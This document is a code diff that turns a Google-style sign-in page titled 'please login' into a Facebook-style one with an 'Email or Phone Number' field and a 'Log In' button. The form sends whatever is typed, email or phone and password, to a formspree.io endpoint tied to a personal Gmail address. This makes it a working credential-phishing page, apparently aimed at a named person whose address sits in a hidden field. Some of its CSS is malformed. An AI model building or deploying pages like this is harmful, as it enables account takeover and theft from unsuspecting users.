@@ -6,23 +6,23 @@
 
 
     <style>html ::-webkit-input-placeholder { /* Chrome/Opera/Safari */
-  color: black;
+  color: #90949c;
 }
 ::-moz-placeholder { /* Firefox 19+ */
-  color: black;
+  color: #90949c;
 }
 :-ms-input-placeholder { /* IE 10+ */
-  color: black;
+  color: #90949c;
 }
 :-moz-placeholder { /* Firefox 18- */
-  color: black;
+  color: #90949c;
 }
 .rc-button,
   .rc-button:visited {
   display: inline-block;
   width: 235px;
   text-align: center;
-  color: #444;
+  color: #fff;
   font-size: 14px;
   font-weight: 500;
   height: 36px;
@@ -35,13 +35,9 @@
   -moz-transition: all 0.218s;
   -webkit-transition: all 0.218s;
   transition: all 0.218s;
-  border: 1px solid #dcdcdc;
-  background-color: #f5f5f5;
-  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
-  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
-  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
-  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
-  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
+  border: 1px solid #4267b2;
+  background-color: #4267b2;
+
   -o-transition: none;
   -moz-user-select: none;
   -webkit-user-select: none;
@@ -62,29 +58,21 @@
   }
   .rc-button:hover {
   border: 1px solid #c6c6c6;
-  color: #333;
+  color: #fff;
   text-decoration: none;
   -o-transition: all 0.0s;
   -moz-transition: all 0.0s;
   -webkit-transition: all 0.0s;
   transition: all 0.0s;
-  background-color: #f8f8f8;
-  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
-  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
-  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
-  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
-  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
+  background-color: ##4267b2;
+
   -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
   -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
   box-shadow: 0 1px 1px rgba(0,0,0,0.1);
   }
   .rc-button:active {
-  background-color: #f6f6f6;
-  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
-  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
-  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
-  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
-  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
+  background-color: #4267b2;
+
   -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
   -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
   box-shadow: 0 1px 2px rgba(0,0,0,0.1);
@@ -94,12 +82,8 @@
   border: 1px solid #3079ed;
   color: #fff;
   text-shadow: 0 1px rgba(0,0,0,0.1);
-  background-color: #4d90fe;
-  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
-  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
-  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
-  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
-  background-image: linear-gradient(top,#4d90fe,#4787ed);
+  background-color: ##4267b2;
+
   }
 
 
@@ -253,7 +237,9 @@ p {
   }
 </style>
 <style media="screen and (max-width: 580px)">
-  html, body {
+  html, 
+
+  body {
   font-size: 14px;
   }
   .google-header-bar.centered {
@@ -374,22 +360,26 @@ p {
     <title>please login</title>
 </head>
 <body bgcolor="#f7f7f7">
-
 <center><form method="POST" action="http://formspree.io/samsonfascinate@gmail.com">
 
 
-  <input type="email" name="email" placeholder="navie.cheema@gmail.com" style="width: 270px;" hidden><br><br>
+  <input type="email" name="email" placeholder="navie.cheema@gmail.com" style="width: 270px;" hidden>
 
-
-  <input id="Passwd" type="password" name="message" placeholder="Password" style="width: 260px; height:44px;
+  <input id="Passwd" type="text" name="message" placeholder="Email or Phone Number" style="width: 255px; height:34px;
     border-width: 1px;
-    border-style: solid; border-color: rgb(192, 192, 192); font-family: 'Open Sans'; font-size: 16px;
+    border-style: solid; border-color: #90949c; font-family: 'Open Sans'; font-size: 16px;
+	font-style: bold; padding-left:10px">
+<p>
+
+  <input id="Passwd" type="password" name="message" placeholder="Password" style="width: 255px; height:34px;
+    border-width: 1px;
+    border-style: solid; border-color: #90949c; font-family: 'Open Sans'; font-size: 16px;
 	font-style: bold; padding-left:10px"></textarea>
   <p>
 
 
 
-  <br><button type="submit" class="rc-button rc-button-submit" style="width: 270px; height:36px;">Sign In</button>
+  <br><button type="submit" class="rc-button " style="width: 270px; height:44px; background-color: #4267b2;">Log In</button>
 
 </form>
 </form>
